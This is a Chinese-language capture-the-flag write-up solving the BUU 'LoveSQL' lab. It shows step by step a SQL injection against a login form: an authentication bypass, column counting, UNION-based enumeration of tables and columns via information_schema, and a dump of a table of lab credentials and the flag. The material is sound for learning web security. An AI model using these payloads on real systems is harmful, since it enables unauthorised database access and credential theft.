---
{"dg-publish":true,"dg-path":"安全/靶场/BUU_[极客大挑战 2019]LoveSQL 1.md","permalink":"/安全/靶场/BUU_[极客大挑战 2019]LoveSQL 1/","title":"BUU_[极客大挑战 2019]LoveSQL 1"}
---


![Pasted image 20240805172328.png](/img/user/picture/Pasted%20image%2020240805172328.png)
进去就是一个登录界面


随便输入一下
![Pasted image 20240805172439.png](/img/user/picture/Pasted%20image%2020240805172439.png)
发现他是通过url进行传输的

这个后端一定是一个select查询语句
我们尝试将其加上引号来闭合一下语句看一下可不可行


```url
/check.php
?username=111 ' or 1 %23
&password=111
```

> [!NOTE] 注意
> 注意`#`号在url中应写为`%23`


![Pasted image 20240805172857.png](/img/user/picture/Pasted%20image%2020240805172857.png)
发现这里显示成功登陆，并且输出了admin和他的密码(虽然这个两个数据没什么用)

猜测应该是将语句带入数据库查询，如果查询结果不为空，则输出第一个查询结果，如果为空，则输出`# NO,Wrong username password！！！`

下面进行简单测试:
`?username=111 ' or 1 limit 0,1 %23`时还是显示admin
`?username=111 ' or 1 limit 1,1 %23`时显示`# NO,Wrong username password！！！`，猜测这个表中只有一个用户admin
虽然这一步没什么用，但是由于现在由于SQL注入不太熟练，所以感觉应该多思考一下，而不是知识专注于解题


接下来就要用`order by`来知道后端查询语句究竟是select几个值

发现
`?username=admin ' order by 3 %23`时正常显示
`?username=admin ' order by 4 %23`时报错
![Pasted image 20240805174123.png](/img/user/picture/Pasted%20image%2020240805174123.png)
所以只有3个值


接下来我们使用`union`联合查询查看回显位
`?username=111 '  union select 1,2,3 %23`
![Pasted image 20240805174303.png](/img/user/picture/Pasted%20image%2020240805174303.png)
注意，这里username不能设置为admin，因为如果设置为admin，会导致查出来的结果有两个，一个是admin，一个是1，2，3
前端会显示第一个，也就是只会显示admin，所以我们要写一个不存在的用户名


接下来我们查看数据库名
`?username=111 '  union select 1,database(),3 %23`
![Pasted image 20240805174531.png](/img/user/picture/Pasted%20image%2020240805174531.png)
知道数据库名为`geek`


接下来我们查看表名
`?username=111 '  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23`
注意这条查询语句放在2号位会报错
![Pasted image 20240805174726.png](/img/user/picture/Pasted%20image%2020240805174726.png)
知道有两个数据库
`geekuser` `l0ve1ysq1`

猜测我们想要的信息在`l0ve1ysq1`中，而`geekuser`这个是登陆查询的表

接下来我们查看每个表的列名
`?username=111 '  union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='geekuser'%23`
![Pasted image 20240805174951.png](/img/user/picture/Pasted%20image%2020240805174951.png)

`?username=111 '  union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23`
![Pasted image 20240805175017.png](/img/user/picture/Pasted%20image%2020240805175017.png)

发现两个表的列名都是一样的，都是`id` `username` `password`



接下来查看表中的内容
首先是`l0ve1ysq1`表
`?username=111 '  union select 1,2,group_concat(CONCAT_WS(' ', id, username, password) SEPARATOR ', ') FROM l0ve1ysq1 %23`
![Pasted image 20240805181140.png](/img/user/picture/Pasted%20image%2020240805181140.png)
也就是
```
1 cl4y wo_tai_nan_le, 
2 glzjin glzjin_wants_a_girlfriend, 
3 Z4cHAr7zCr biao_ge_dddd_hm, 
4 0xC4m3l linux_chuang_shi_ren, 
5 Ayrain a_rua_rain, 
6 Akko yan_shi_fu_de_mao_bo_he, 
7 fouc5 cl4y, 
8 fouc5 di_2_kuai_fu_ji, 
9 fouc5 di_3_kuai_fu_ji, 
10 fouc5 di_4_kuai_fu_ji, 
11 fouc5 di_5_kuai_fu_ji, 
12 fouc5 di_6_kuai_fu_ji, 
13 fouc5 di_7_kuai_fu_ji, 
14 fouc5 di_8_kuai_fu_ji, 
15 leixiao Syc_san_da_hacker, 
16 flag flag{9c5e3c2a-44a0-4009-b3ca-dc9186c337df}
```
找到了flag


下面查看一下表`geekuser`,看看是不是只有一个admin数据
![Pasted image 20240805181347.png](/img/user/picture/Pasted%20image%2020240805181347.png)
果然是











